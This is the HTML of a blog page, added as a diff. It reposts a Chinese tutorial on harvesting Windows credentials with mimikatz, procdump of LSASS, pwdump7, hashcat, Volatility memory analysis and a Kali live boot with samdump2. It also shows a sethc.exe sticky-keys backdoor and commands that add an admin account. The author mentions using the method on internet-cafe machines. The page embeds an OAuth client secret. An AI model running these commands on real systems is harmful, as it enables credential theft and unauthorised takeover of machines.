@@ -1,0 +1,248 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Gxkon's Blog | Gxkon's Blog</title><meta name="description" content="边学边做"><meta name="author" content="Gkon"><meta name="copyright" content="Gkon"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/Pic/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="twitter:card" content="summary"><meta name="twitter:title" content="Gxkon's Blog"><meta name="twitter:description" content="边学边做"><meta name="twitter:image" content="http://gxkon.top/Pic/post.jpg"><meta property="og:type" content="website"><meta property="og:title" content="Gxkon's Blog"><meta property="og:url" content="http://gxkon.top/%E5%BE%85%E5%AE%8C%E5%96%84/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93.html"><meta property="og:site_name" content="Gxkon's Blog"><meta property="og:description" content="边学边做"><meta property="og:image" content="http://gxkon.top/Pic/post.jpg"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>var autoChangeMode = '1'
+var t = Cookies.get("theme")
+if (autoChangeMode == '1'){
+  var isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
+  var isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
+  var isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
+  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+  if (t === undefined){
+    if (isLightMode) activateLightMode()
+    else if (isDarkMode) activateDarkMode()
+    else if (isNotSpecified || hasNoSupport){
+      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
+      var now = new Date()
+      var hour = now.getHours()
+      var isNight = hour < 6 || hour >= 18
+      isNight ? activateDarkMode() : activateLightMode()
+  }
+  } else if (t == 'light') activateLightMode()
+  else activateDarkMode()
+
+} else if (autoChangeMode == '2'){
+  now = new Date();
+  hour = now.getHours();
+  isNight = hour < 6 || hour >= 18
+  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
+  else if (t === 'light') activateLightMode()
+  else activateDarkMode() 
+} else {
+  if ( t == 'dark' ) activateDarkMode()
+  else if ( t == 'light') activateLightMode()
+}
+
+function activateDarkMode(){
+  document.documentElement.setAttribute('data-theme', 'dark')
+  if (document.querySelector('meta[name="theme-color"]') !== null){
+    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
+  }
+}
+function activateLightMode(){
+  document.documentElement.setAttribute('data-theme', 'light')
+  if (document.querySelector('meta[name="theme-color"]') !== null){
+  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
+  }
+}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="canonical" href="http://gxkon.top/%E5%BE%85%E5%AE%8C%E5%96%84/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93.html"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js"></script><script src="https://cdn.jsdelivr.net/npm/blueimp-md5/js/md5.min.js"></script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://xxx/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  bookmark: {
+    message_prev: '按',
+    message_next: '键将本页加入书签'
+  },
+  runtime_unit: '天',
+  runtime: true,
+  copyright: undefined,
+  ClickShowText: {"text":"本人,超帅,打钱","fontSize":"15px"},
+  medium_zoom: false,
+  fancybox: true,
+  Snackbar: undefined,
+  baiduPush: false,
+  highlightCopy: true,
+  highlightLang: true,
+  highlightShrink: 'false',
+  isFontAwesomeV5: false,
+  isPhotoFigcaption: false
+  
+}</script><script>var GLOBAL_CONFIG_SITE = { 
+  isPost: false,
+  isHome: false,
+  isSidebar: false  
+  }</script><noscript><style>
+#page-header {
+  opacity: 1
+}
+.justified-gallery img{
+  opacity: 1
+}
+</style></noscript><meta name="generator" content="Hexo 4.2.0"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/Pic/avatar.png" onerror="onerror=null;src='/Pic/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">16</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">16</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">13</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于我</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> 娱乐</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> 电影</span></a></li></ul></div></div></div></div><div id="body-wrap"><div class="not-index-bg" id="nav" style="background-image: url(/Pic/index.jpg)"><div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">Gxkon's Blog</a></span><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于我</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> 娱乐</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> 电影</span></a></li></ul></div></div><span class="toggle-menu close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span></span></div><div id="page_site-info"><h1 id="site_title">Gxkon's Blog</h1></div></div><main class="layout_page" id="content-inner"><div id="page"><div id="article-container"><p>文章来自：<a href="https://times0ng.github.io/2018/04/20/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">times0ng</a></p>
+<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00. 前言"></a>0x00. 前言</h3><p>渗透测试过程中我们经常需要获取管理员的账号密码，以便进行更进一步的操作，下面我将给大家总结几种steal account的手法！其中可能也会涉及到apt的内容，希望大家喜欢。</p>
+<blockquote>
+<p>本教程具有一定攻击性，仅限于教学使用，不得用于其他用途</p>
+</blockquote>
+<h3 id="0x01-利用mimikatz获取明文密码"><a href="#0x01-利用mimikatz获取明文密码" class="headerlink" title="0x01. 利用mimikatz获取明文密码"></a>0x01. 利用mimikatz获取明文密码</h3><ul>
+<li><h4 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h4><ul>
+<li><code>windows 10</code>  // （win 10中有defender会杀掉我们的mimikatz，关掉就好）</li>
+<li><code>mimikatz_trunk</code> - <a href="http://blog.gentilkiwi.com/mimikatz" target="_blank" rel="noopener">download here</a></li>
+</ul>
+</li>
+<li><h4 id="实验步骤："><a href="#实验步骤：" class="headerlink" title="实验步骤："></a>实验步骤：</h4></li>
+</ul>
+<ol>
+<li><p>首先用管理员账号运行cmd.exe，这样才能让mimikatz正常运行 :)</p>
+</li>
+<li><p>紧接着再进入mimikatz，运行命令</p>
+<blockquote>
+</blockquote>
+<p> privilege::debug<br> sekurlsa::logonpasswords</p>
+</li>
+<li><p>此时我们就能得到username，password的密文，给大家推荐个网站-<a href="https://www.somd5.com/" target="_blank" rel="noopener">here</a>，这里可以很容易的解密大多数密文</p>
+</li>
+</ol>
+<h3 id="0x02-利用procdump-amp-mimikatz获取密码"><a href="#0x02-利用procdump-amp-mimikatz获取密码" class="headerlink" title="0x02. 利用procdump &amp; mimikatz获取密码"></a>0x02. 利用procdump &amp; mimikatz获取密码</h3><ul>
+<li><h4 id="实验环境：-1"><a href="#实验环境：-1" class="headerlink" title="实验环境："></a>实验环境：</h4></li>
+</ul>
+<ol>
+<li><code>windows 7</code></li>
+<li><code>procdump</code>- <a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump" target="_blank" rel="noopener">download here</a></li>
+<li><code>mimikatz_trunk</code></li>
+</ol>
+<ul>
+<li><h4 id="实验步骤：-1"><a href="#实验步骤：-1" class="headerlink" title="实验步骤："></a>实验步骤：</h4></li>
+</ul>
+<ol>
+<li><p>首先用procdump下载LSASS进程的内存，因为procdump是Microsoft Sysinternals tools中的工具，所以AV是不会查杀它的（记住用管理员运行cmd ）</p>
+<blockquote>
+</blockquote>
+<p> C:\Users\times0ng\Desktop\Procdump\procdump.exe -accepteula -ma lsass.exe C:\Users\times0ng\Desktop\lsass.dmp</p>
+</li>
+<li><p>接着用mimikatz打开dmp文件，获取内存中的内容  // （ lsass.dmp可以下载到我们本地主机再查看里面的内容，相当于离线模式 ）</p>
+<blockquote>
+</blockquote>
+<p> C:\Users\times0ng\Desktop\mimikatz_trunk\x64\mimikatz.exe</p>
+<p> sekurlsa::minidump C:\Users\time0sng\Desktop\lsass.dmp</p>
+<p> sekurlsa::tspkg</p>
+</li>
+</ol>
+<h3 id="0x03-利用pwdump7获取密码"><a href="#0x03-利用pwdump7获取密码" class="headerlink" title="0x03. 利用pwdump7获取密码"></a>0x03. 利用pwdump7获取密码</h3><ul>
+<li><h4 id="实验环境：-2"><a href="#实验环境：-2" class="headerlink" title="实验环境："></a>实验环境：</h4></li>
+</ul>
+<ol>
+<li><code>windows 7</code></li>
+<li><code>pwdump7</code>  <a href="http://passwords.openwall.net/b/pwdump/pwdump7.zip" target="_blank" rel="noopener">download here</a></li>
+</ol>
+<ul>
+<li><h4 id="实验步骤：-2"><a href="#实验步骤：-2" class="headerlink" title="实验步骤："></a>实验步骤：</h4></li>
+</ul>
+<ol>
+<li><p>直接用管理员运行cmd，再运行pwdump7.exe</p>
+</li>
+<li><p>用hashcat直接跑NTLM密码</p>
+<blockquote>
+</blockquote>
+<p> hashcat -m 1000 AFC44EE7351D61D00698796DA06B1EBF /usr/share/wordlists/sqlmap.txt –force</p>
+</li>
+</ol>
+<h3 id="0x04-利用虚拟机文件获取密码"><a href="#0x04-利用虚拟机文件获取密码" class="headerlink" title="0x04. 利用虚拟机文件获取密码"></a>0x04. 利用虚拟机文件获取密码</h3><p>关于如何用工具直接获取密码就介绍到这里，其实还不止以上这些工具可以帮助我们达到目的，例如：<a href="https://github.com/giMini/PowerMemory" target="_blank" rel="noopener">PowerMemory</a>、<a href="https://github.com/quarkslab/quarkspwdump" target="_blank" rel="noopener">quarks pwdump</a> 等都是不错的工具，不过我觉得以上介绍的已经足够大家使用，贪多嚼不烂，下面我将介绍其它不同于上述的方法获取hash密码！<br>接下来我们将获取Windows 7虚拟机中的账号密码，首先需要将虚拟机挂起，这样才能产生 *.vmss 和 *.vmem 文件！这两个文件主要是用来获取内存数据的，如果用其它工具能够获取内存数据的话完全可以不用这两个文件，例如：<a href="https://www.fireeye.com/services/freeware/memoryze.html" target="_blank" rel="noopener">Memoryze</a> 、<a href="http://qpdownload.com/dumpit/" target="_blank" rel="noopener">DumpIt</a></p>
+<ul>
+<li><h4 id="实验环境：-3"><a href="#实验环境：-3" class="headerlink" title="实验环境："></a>实验环境：</h4></li>
+</ul>
+<ol>
+<li><code>windows 7 挂起状态</code></li>
+<li><code>Vmss2core</code>  // <a href="https://labs.vmware.com/flings/vmss2core#summary" target="_blank" rel="noopener">download here</a></li>
+<li><code>Volatility</code>   // <a href="http://www.volatilityfoundation.org/26" target="_blank" rel="noopener">download here</a></li>
+</ol>
+<ul>
+<li><h4 id="实验步骤：-3"><a href="#实验步骤：-3" class="headerlink" title="实验步骤："></a>实验步骤：</h4></li>
+</ul>
+<ol>
+<li>运行Vmss2core解析虚拟机文件，生成memory.dmp文件<blockquote>
+<p>./vmss2core-mac64 -W /Users/apple1/Documents/Virtual\ Machines.localized/Windows\ 7\ x64.vmwarevm/Windows\ 7\ x64-89925192.vmss /Users/apple1/Documents/Virtual\ Machines.localized/Windows\ 7\ x64.vmwarevm/Windows\ 7\ x64-89925192.vmem </p>
+</blockquote>
+</li>
+</ol>
+<ol start="2">
+<li>利用大神级取证工具volatility获取SYSTEM和SAM的虚拟地址，–profile=Win7SP1x64 架构一定要指定正确，不然会找不到地址<blockquote>
+<p>./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone hivelist -f memory.dmp –profile=Win7SP1x64</p>
+</blockquote>
+</li>
+</ol>
+<ol start="3">
+<li>接下来要做的就是获取对应地址的数据了，记住sys-offset和sam-offset指定的都是虚拟地址，别乱指什么物理地址，可以看到我这里有两个用户账号，它们的NTML hash都被我拿到了，随便找点工具解密就行了，上面也讲过hashcat解密！<blockquote>
+<p>./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone hashdump -f memory.dmp –profile=Win7SP1x64 sys-offset=0xfffff8a000024010 sam-offset=0xfffff8a000b33010</p>
+</blockquote>
+</li>
+</ol>
+<h3 id="0x05-利用kali-ISO获取密码"><a href="#0x05-利用kali-ISO获取密码" class="headerlink" title="0x05. 利用kali ISO获取密码"></a>0x05. 利用kali ISO获取密码</h3><p>这是笔者最喜欢使用的方法，也是最早掌握的方法，说个题外话：当初我还利用这个方法在网吧免费上网，甚至因为网吧的局域网win7环境我还拿到几台肉鸡shell，不过就是玩玩没干坏事。<br>在开始之前我们应该先准备一个USB启动盘，制作方法可以看<a href="https://times0ng.github.io/2018/03/01/kali%E5%AE%89%E8%A3%85KVM%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">我以前的文章</a>，不过我现在只是为了演示一下效果就直接使用VM虚拟机插入ISO文件模拟USB启动盘。</p>
+<ul>
+<li><h4 id="实验环境：-4"><a href="#实验环境：-4" class="headerlink" title="实验环境："></a>实验环境：</h4></li>
+</ul>
+<ol>
+<li><code>windows 10</code></li>
+<li><code>kali ISO</code>  - <a href="https://www.kali.org/downloads/" target="_blank" rel="noopener">download here</a></li>
+</ol>
+<ul>
+<li><h4 id="实验步骤：-4"><a href="#实验步骤：-4" class="headerlink" title="实验步骤："></a>实验步骤：</h4></li>
+</ul>
+<ol>
+<li><p>首先将kali ISO镜像文件映射到win10虚拟机中（如果你是用USB启动盘插入物理机的话需要先进入BIOS引导界面，然后修改启动顺序，将USB放到硬盘之前 ）</p>
+</li>
+<li><p>然后启动win10就会进入kali的引导界面，我们点击Live (amd 64) 即可</p>
+</li>
+<li><p>进入kali之后，先查看win10在哪个硬盘（一般就是size最大的那个盘），然后将其挂载到 /mnt 目录下，之后对/mnt目录下的操作就相当于对win10进行操作了</p>
+<blockquote>
+</blockquote>
+<p> fdisk -l &amp;&amp; mount /dev/sda2 /mnt &amp;&amp; cd /mnt/ </p>
+</li>
+<li><p>挂载完之后我们先盗取账号密码【Win10果然更安全了，居然显示是空密码，这显然不是我们要的结果，第二张图附上Win7的效果图】</p>
+<blockquote>
+</blockquote>
+<p> cd /mnt/Windows/System32/config/ &amp;&amp; samdump2 SYSTEM SAM<br> hashcat -m 1000 afc44ee7351d61d00698796da06b1ebf /usr/share/wordlists/sqlmap.txt –force</p>
+</li>
+<li><p>虽然win10密码安全性加强了，但并不阻碍我们进行别的操作，下面我们使用经典的shift提权技术来完成进一步操作，<a href="https://times0ng.github.io/2018/04/13/Windows-%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8B%EF%BC%89/" target="_blank" rel="noopener">上一篇Windows 提权基础</a> 讲漏了，这里补上</p>
+<blockquote>
+</blockquote>
+<p> cd /mnt/Windows/System32/<br> cp cmd.exe sethc.exe</p>
+</li>
+<li><p>OK 现在需要做的就是关闭kali ，将映射到win10的ISO移除，然后启动win10，可以看到登录界面，此时我们连续快速的多次按shift键就能弹出命令行</p>
+</li>
+<li><p>我们的权限这么大，想必添加个管理员账号什么的也不成问题，下面我添加个test管理员账号，然后登录，一进去就碰到win10给我各种Hi，看得我一脸懵逼</p>
+<blockquote>
+</blockquote>
+<p> net user test test /add<br> net localgroup administrators /add test<br> logoff</p>
+</li>
+<li><p>刚才我们没能抓到win10的hash，但是如果我们仍然想登录times0ng账号的话可以先用命令行修改密码，然后再登陆。【很尴尬，自己的ID都敲错了】</p>
+<blockquote>
+</blockquote>
+<p> net user time0sng toor</p>
+</li>
+</ol>
+</div><hr><div id="post-comment"><div class="comment_headling"><i class="fa fa-comments fa-fw" aria-hidden="true"></i><span> 评论</span></div><div id="gitalk-container"></div><script>var gitalk = new Gitalk({
+  clientID: '1ce3148e3133bf004c96',
+  clientSecret: '2a1e5c0f4d38387460b916843bfe5cac67ef2d07',
+  repo: 'blankwz.github.io',
+  owner: 'blankwz',
+  admin: ['blankwz'],
+  id: md5(decodeURI(location.pathname)),
+  language: 'zh-CN',
+  perPage: 10,
+  distractionFreeMode: false,
+  pagerDirection: 'last',
+  createIssueManually: false,
+  updateCountCallback: commentCount
+})
+gitalk.render('gitalk-container')
+
+function commentCount(n){
+  try {
+    document.getElementsByClassName('gitalk-comment-count')[0].innerHTML= n
+  } catch (e) {
+    return false
+  }
+}</script></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/Pic/avatar.png" onerror="this.onerror=null;this.src='/Pic/friend_404.gif'" alt="avatar"/><div class="author-info__name">Gkon</div><div class="author-info__description">边学边做</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives"><div class="headline">文章</div><div class="length_num">16</div></a></div><div class="card-info-data-item is-center">      <a href="/tags"><div class="headline">标签</div><div class="length_num">16</div></a></div><div class="card-info-data-item is-center">     <a href="/categories"><div class="headline">分类</div><div class="length_num">13</div></a></div></div><div class="card-info-bookmark is-center"><a class="bookmark button--primary button--animated" id="bookmark-it" href="javascript:;" title="加入书签" target="_self"><i class="fa fa-bookmark" aria-hidden="true"></i><span>加入书签</span></a></div><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/blankwz" target="_blank" title="Github"><i class="fa fa-github" aria-hidden="true"></i></a><a class="social-icon" href="mailto:hetiwz@gmail.com" target="_blank" title="Email"><i class="fa fa-envelope" aria-hidden="true"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="RSS"><i class="fa fa-rss" aria-hidden="true"></i></a></div></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fa fa-bullhorn card-announcement-animation" aria-hidden="true"></i><span>公告</span></div><div class="announcement_content">你好，陌生人</div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fa fa-history" aria-hidden="true"></i><span>最新文章</span></div><div class="aside-recent-item"> <div class="aside-recent-post"><a href="/posts/4fc79989/"><div class="aside-post-cover"><img class="aside-post-bg lazyload" data-src="https://tva1.sinaimg.cn/large/4a9e9735gy1gdpu1xq0vbj20ex08c3z4.jpg" onerror="this.onerror=null;this.src='/Pic/404.jpg'" title="MacOS新人上手" alt="MacOS新人上手"/></div><div class="aside-post-title"><div class="aside-post_title" href="/posts/4fc79989/" title="MacOS新人上手">MacOS新人上手</div><time class="aside-post_meta post-meta__date" title="发表于 2020-04-05 16:22:11">2020-04-05</time></div></a></div><div class="aside-recent-post"><a href="/posts/26ad476c/"><div class="aside-post-cover"><img class="aside-post-bg lazyload" data-src="https://tva3.sinaimg.cn/large/4a9e9735gy1gdgwd7o1wej207n0530so.jpg" onerror="this.onerror=null;this.src='/Pic/404.jpg'" title="转载 - 显示器选购指南" alt="转载 - 显示器选购指南"/></div><div class="aside-post-title"><div class="aside-post_title" href="/posts/26ad476c/" title="转载 - 显示器选购指南">转载 - 显示器选购指南</div><time class="aside-post_meta post-meta__date" title="发表于 2020-04-03 21:22:11">2020-04-03</time></div></a></div><div class="aside-recent-post"><a href="/posts/a79828f9/"><div class="aside-post-cover"><img class="aside-post-bg lazyload" data-src="https://tvax1.sinaimg.cn/large/4a9e9735gy1gdgwmjm4azj21hc0zh4ik.jpg" onerror="this.onerror=null;this.src='/Pic/404.jpg'" title="Hexo - 常用命令及命令详解" alt="Hexo - 常用命令及命令详解"/></div><div class="aside-post-title"><div class="aside-post_title" href="/posts/a79828f9/" title="Hexo - 常用命令及命令详解">Hexo - 常用命令及命令详解</div><time class="aside-post_meta post-meta__date" title="发表于 2020-03-31 20:19:26">2020-03-31</time></div></a></div><div class="aside-recent-post"><a href="/posts/c19b1bee/"><div class="aside-post-cover"><img class="aside-post-bg lazyload" data-src="https://tvax2.sinaimg.cn/large/4a9e9735gy1gdc2x7rqddj21400mi78f.jpg" onerror="this.onerror=null;this.src='/Pic/404.jpg'" title="问题汇总之Git与Github" alt="问题汇总之Git与Github"/></div><div class="aside-post-title"><div class="aside-post_title" href="/posts/c19b1bee/" title="问题汇总之Git与Github">问题汇总之Git与Github</div><time class="aside-post_meta post-meta__date" title="发表于 2020-03-29 20:46:25">2020-03-29</time></div></a></div><div class="aside-recent-post"><a href="/posts/99fff05c/"><div class="aside-post-cover"><img class="aside-post-bg lazyload" data-src="https://tva1.sinaimg.cn/large/4a9e9735gy1gdc2zapcifj20xc0dwjrk.jpg" onerror="this.onerror=null;this.src='/Pic/404.jpg'" title="本站点Hexo配置" alt="本站点Hexo配置"/></div><div class="aside-post-title"><div class="aside-post_title" href="/posts/99fff05c/" title="本站点Hexo配置">本站点Hexo配置</div><time class="aside-post_meta post-meta__date" title="发表于 2020-03-29 16:54:12">2020-03-29</time></div></a></div></div></div></div><div class="card-widget card-categories"><div class="card-content"><div class="item-headline"><i class="fa fa-folder-open" aria-hidden="true"></i><span>分类</span></div><ul class="aside-category-item">       <li class="aside-category-list"><a class="aside-category-list_link" href="/categories/Hexo/"><span class="aside-category-list_name">Hexo</span><span class="aside-category-list_length">2</span></a></li><li class="aside-category-list"><a class="aside-category-list_link" href="/categories/%E5%B0%8F%E7%9F%A5%E8%AF%86/"><span class="aside-category-list_name">小知识</span><span class="aside-category-list_length">2</span></a></li><ul class="aside-category-item child"><li class="aside-category-list"><a class="aside-category-list_link" href="/categories/%E5%B0%8F%E7%9F%A5%E8%AF%86/%E7%A1%AC%E4%BB%B6/"><span class="aside-category-list_name">硬件</span><span class="aside-category-list_length">1</span></a></li><li class="aside-category-list"><a class="aside-category-list_link" href="/categories/%E5%B0%8F%E7%9F%A5%E8%AF%86/%E7%B3%BB%E7%BB%9F/"><span class="aside-category-list_name">系统</span><span class="aside-category-list_length">1</span></a></li></ul><li class="aside-category-list"><a class="aside-category-list_link" href="/categories/%E6%8E%A8%E8%8D%90/"><span class="aside-category-list_name">推荐</span><span class="aside-category-list_length">5</span></a></li><li class="aside-category-list"><a class="aside-category-list_link" href="/categories/%E7%AC%94%E8%AE%B0/"><span class="aside-category-list_name">笔记</span><span class="aside-category-list_length">2</span></a></li><ul class="aside-category-item child"><li class="aside-category-list"><a class="aside-category-list_link" href="/categories/%E7%AC%94%E8%AE%B0/Python/"><span class="aside-category-list_name">Python</span><span class="aside-category-list_length">2</span></a></li></ul><li class="aside-category-list"><a class="aside-category-list_link" href="/categories/%E8%BE%B9%E5%AD%A6%E8%BE%B9%E5%81%9A/"><span class="aside-category-list_name">边学边做</span><span class="aside-category-list_length">1</span></a></li><ul class="aside-category-item child"><li class="aside-category-list"><a class="aside-category-list_link" href="/categories/%E8%BE%B9%E5%AD%A6%E8%BE%B9%E5%81%9A/Hexo/"><span class="aside-category-list_name">Hexo</span><span class="aside-category-list_length">1</span></a></li></ul><li class="aside-category-list"><a class="aside-category-list_link" href="/categories/%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/"><span class="aside-category-list_name">问题汇总</span><span class="aside-category-list_length">3</span></a></li><ul class="aside-category-item child"><li class="aside-category-list"><a class="aside-category-list_link" href="/categories/%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/Github/"><span class="aside-category-list_name">Github</span><span class="aside-category-list_length">1</span></a></li><li class="aside-category-list"><a class="aside-category-list_link" href="/categories/%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/Mac/"><span class="aside-category-list_name">Mac</span><span class="aside-category-list_length">1</span></a></li><li class="aside-category-list"><a class="aside-category-list_link" href="/categories/%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/windows/"><span class="aside-category-list_name">windows</span><span class="aside-category-list_length">1</span></a></li></ul></ul></div></div><div class="card-widget card-tags"><div class="card-content"><div class="item-headline"><i class="fa fa-tags" aria-hidden="true"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/APP/" style="font-size: 16px; color: #999">APP</a> <a href="/tags/Chrome/" style="font-size: 16px; color: #999">Chrome</a> <a href="/tags/Github/" style="font-size: 18.67px; color: #999ea6">Github</a> <a href="/tags/Hexo/" style="font-size: 21.33px; color: #99a4b2">Hexo</a> <a href="/tags/IOS/" style="font-size: 16px; color: #999">IOS</a> <a href="/tags/Mac/" style="font-size: 16px; color: #999">Mac</a> <a href="/tags/Python%E7%AC%94%E8%AE%B0/" style="font-size: 18.67px; color: #999ea6">Python笔记</a> <a href="/tags/Windows/" style="font-size: 18.67px; color: #999ea6">Windows</a> <a href="/tags/%E5%A5%BD%E7%89%A9%E6%8E%A8%E8%8D%90/" style="font-size: 24px; color: #99a9bf">好物推荐</a> <a href="/tags/%E6%8E%A8%E8%8D%90/" style="font-size: 16px; color: #999">推荐</a> <a href="/tags/%E6%8F%92%E4%BB%B6/" style="font-size: 16px; color: #999">插件</a> <a href="/tags/%E6%96%B0%E7%9A%84%E5%BC%80%E5%A7%8B/" style="font-size: 16px; color: #999">新的开始</a> <a href="/tags/%E7%BD%91%E7%AB%99/" style="font-size: 16px; color: #999">网站</a> <a href="/tags/%E8%A3%85%E6%9C%BA/" style="font-size: 16px; color: #999">装机</a> <a href="/tags/%E8%B5%84%E6%BA%90/" style="font-size: 16px; color: #999">资源</a> <a href="/tags/%E9%97%AE%E9%A2%98/" style="font-size: 21.33px; color: #99a4b2">问题</a></div></div></div><div class="card-widget card-archives"><div class="card-content"><div class="item-headline"><i class="fa fa-archive" aria-hidden="true"></i><span>归档</span></div><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/"><span class="archive-list-date">2020年04月</span><span class="archive-list-count">2</span></a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/"><span class="archive-list-date">2020年03月</span><span class="archive-list-count">14</span></a></li></ul></div></div><div class="card-widget card-webinfo"><div class="card-content"><div class="item-headline"><i class="fa fa-line-chart" aria-hidden="true"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="webinfo-article-name">文章数目 :</div><div class="webinfo-article-count">16</div></div><div class="webinfo-item"><div class="webinfo-runtime-name">已运行时间 :</div><div class="webinfo-runtime-count" id="webinfo-runtime-count" start_date="3/25/2020 00:00:00">     </div></div><div class="webinfo-item">      <div class="webinfo-site-uv-name">本站访客数 :</div><div class="webinfo-site-uv-count" id="busuanzi_value_site_uv"></div></div><div class="webinfo-item"><div class="webinfo-site-name">本站总访问量 :</div><div class="webinfo-site-pv-count" id="busuanzi_value_site_pv"></div></div></div></div></div></div></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 By Gkon</div><div class="framework-info"><span>驱动 </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="简繁转换" target="_self">簡</a><i class="darkmode fa fa-moon-o" id="darkmode" 